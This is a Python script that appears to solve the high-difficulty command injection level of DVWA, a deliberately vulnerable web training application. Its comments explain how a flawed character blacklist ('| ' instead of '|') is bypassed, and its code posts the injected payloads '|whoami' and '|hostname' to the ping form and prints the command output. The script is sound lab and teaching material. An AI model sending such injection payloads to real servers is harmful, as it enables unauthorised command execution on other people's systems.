#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

from conf import BASE_URL
from util import http_post

# The objective is to found the user running the webserver as well as
# the hostname of the machine through an RCE.

# -----------------------

# In this challenge we have a form which we can use to ping an arbitrary IP address.
#
# In this level the blacklist has been increased and now we block all of the
# following characters
#
# // Set blacklist
# $substitutions = array(
#     '&'  => '',
#     ';'  => '',
#     '| ' => '',
#     '-'  => '',
#     '$'  => '',
#     '('  => '',
#     ')'  => '',
#     '`'  => '',
#     '||' => '',
# );
#
# Notice that the developer made a small mistake here, by writing '| '
# instead of '|'. This opens the door for a command injection wit the payload '|whoami'
# 

# -----------------------

PAYLOADS = {
    "whoami": '|whoami',
    "hostname": '|hostname',
}

DIFFICULTY = "high"

def command_injection_high():
    global DIFFICULTY 

    print("========================================")
    print(f"[INFO] - COMMAND INJECTION {DIFFICULTY}")
    
    for cmd in PAYLOADS:
        payload = PAYLOADS[cmd]
        r = rce(payload)
        soup = BeautifulSoup(r.text, "html.parser")
        div = soup.find("div", {"class": "vulnerable_code_area"})
    
        if div:
            print("----------------------------------")            
            print(f"[SUCCESS]")
            print(f"payload = !{payload}!")

            for elem in div.find_all("pre"):
                cmd_output = elem.text
                print(f"{cmd} = {cmd_output}")

# -----------------------
                
# executes command and return output from webserver
def rce(payload):
    global BASE_URL, DIFFICULTY    
    URL = BASE_URL + "/vulnerabilities/exec/"
    data = f"ip={payload}&Submit=Submit"
    return http_post(URL, DIFFICULTY, data=data)
